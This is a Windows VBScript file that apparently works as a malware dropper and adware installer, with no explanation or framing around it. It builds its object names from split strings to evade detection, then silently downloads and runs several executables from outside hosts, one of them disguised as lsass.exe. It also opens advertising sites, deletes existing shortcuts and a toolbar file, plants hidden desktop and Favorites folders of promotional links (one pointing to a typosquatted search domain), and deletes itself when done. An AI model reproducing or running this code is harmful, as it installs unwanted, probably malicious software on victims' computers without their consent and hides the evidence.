On Error Resume Next
Set twjmogh=CreateObject("Scripting.FileSystemObject")
Set xfuck = CreateObject("M"&"icrosoft.XMLHT"&"T"&"P")
Set tyiulg= WScript.CreateObject("WScript.Shell") 
temppath=tyiulg.ExpandEnvironmentStrings("%temp%")
SYSTEMROOT=tyiulg.Environment("process")("APPDATA")
strDesktop=tyiulg.SpecialFolders("Desktop") 
AllUsersPrograms=tyiulg.SpecialFolders("AllUsersPrograms")
Favorites=tyiulg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Favorites")
Sub cdbvnllt(url,path)
with xfuck
.Open "GET",url,False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile path,eval ("2")
end with
end sub
tyiulg.Run("http://www.700yy.com")
tyiulg.Run("http://www.dddddd.info/hot/")
'call cdbvnllt("http://neirong.funshion.com/software/newfiles/40000/FunshionInstall_C43423.exe",temppath&"\FunshionInstall_C43423.exe")
'tyiulg.run temppath&"\FunshionInstall_C43423.exe /S"
call cdbvnllt("http://download13.subo.me/t58/t58chat_370317.exe",temppath&"\t58chat_370317.exe")
tyiulg.run temppath&"\t58chat_370317.exe /VERYSILENT /SP-"
call cdbvnllt("http://download13.subo.me/9158/9158chat_370317.exe",temppath&"\9158chat_370317.exe")
tyiulg.run temppath&"\9158chat_370317.exe /VERYSILENT /SP-"
call cdbvnllt("http://xia.jime3.info:1268/soft/naq7783.exe",temppath&"\naq7783.exe")
tyiulg.run temppath&"\naq7783.exe"
call cdbvnllt("http://xia.jime3.info:1268/soft/NewFu7783.exe",temppath&"\NewFu7783.exe")
tyiulg.run temppath&"\NewFu7783.exe"
call cdbvnllt("http://xia.jime3.info:1268/soft/UUSee7783.exe",temppath&"\UUSee7783.exe")
tyiulg.run temppath&"\UUSee7783.exe"
call cdbvnllt("http://download13.subo.me/ql2/quliao_398970.exe",temppath&"\quliao_398970.exe")
tyiulg.run temppath&"\quliao_398970.exe /VERYSILENT /SP-"
twjmogh.DeleteFile "C:\Docume~1\All Users\����\�Ա�����.lnk",true
twjmogh.DeleteFile "C:\Docume~1\All Users\����\�ƶ� ��Ϸ��Ӱ���� һ����.lnk",true
twjmogh.DeleteFile "C:\Docume~1\All Users\����\������Ϸ.lnk",true
twjmogh.DeleteFile "C:\Docume~1\All Users\����\������վ��ȫ.lnk",true
twjmogh.DeleteFile "C:\Docume~1\All Users\����\114����ַ����.lnk",true
twjmogh.DeleteFile "C:\Progra~1\Baidu\AddressBar\ASBarBroker.exe",true
twjmogh.DeleteFolder AllUsersPrograms&"\�ƶ�"
twjmogh.DeleteFolder AllUsersPrograms&"\�ٶȵ�ַ��"
'--------------------------------------------------------------------------------
if not twjmogh.FolderExists(""&strDesktop&"\��ҳ��Ϸ") then
twjmogh.CreateFolder(""&strDesktop&"\��ҳ��Ϸ")
end if
Set file=twjmogh.OpenTextFile(""&strDesktop&"\��ҳ��Ϸ\Desktop.ini",2,True)
file.WriteLine("[.ShellClassInfo]")
file.WriteLine("IconFile=%SystemRoot%\system32\SHELL32.dll")
file.WriteLine("IconIndex=160")
file.Close
set file=Nothing
twjmogh.GetFile(""&strDesktop&"\��ҳ��Ϸ\Desktop.ini").Attributes = 4
twjmogh.GetFile(""&strDesktop&"\��ҳ��Ϸ\Desktop.ini").Attributes = 2
twjmogh.GetFolder(""&strDesktop&"\��ҳ��Ϸ").Attributes = 4
Function newurl(intA,intB)
Set file=twjmogh.OpenTextFile(""&strDesktop&"\"&intA&"",2,True)
file.WriteLine("[InternetShortcut]")
file.WriteLine("URL=http://"&intB&"")
file.WriteLine("IconFile=C:\WINDOWS\system32\SHELL32.dll")
file.WriteLine("IconIndex=150")
file.Close
set file=Nothing
End Function
call newurl("��ҳ��Ϸ\Ӣ��Զ��.url","www.7400.net/go/?id=17")
call newurl("��ҳ��Ϸ\������.url","www.7400.net/go/?id=18")
call newurl("��ҳ��Ϸ\��������.url","www.7400.net/go/?id=19")
call newurl("��ҳ��Ϸ\�λ�����.url","www.7400.net/go/?id=20")
call newurl("��ҳ��Ϸ\��������.url","www.7400.net/go/?id=8")
call newurl("��ҳ��Ϸ\�����.url","www.7400.net/go/?id=9")
call newurl("��ҳ��Ϸ\С��Ϸ.url","www.4000.cc")
call newurl("�ٶ�һ��.url","www.googje.in/baidu/")
call newurl("�ȸ�����.url","www.googje.in")
call newurl("�Ա���.url","www.7400.net/taobao/")
twjmogh.CopyFolder ""&strDesktop&"\��ҳ��Ϸ",""&Favorites&"\��ҳ��Ϸ",True
call cdbvnllt("http://down.dddddd.info/lsass.exe",temppath&"\lsass.exe")
tyiulg.run temppath&"\lsass.exe"
WScript.Sleep 5000
twjmogh.DeleteFile WSH.ScriptFullName,True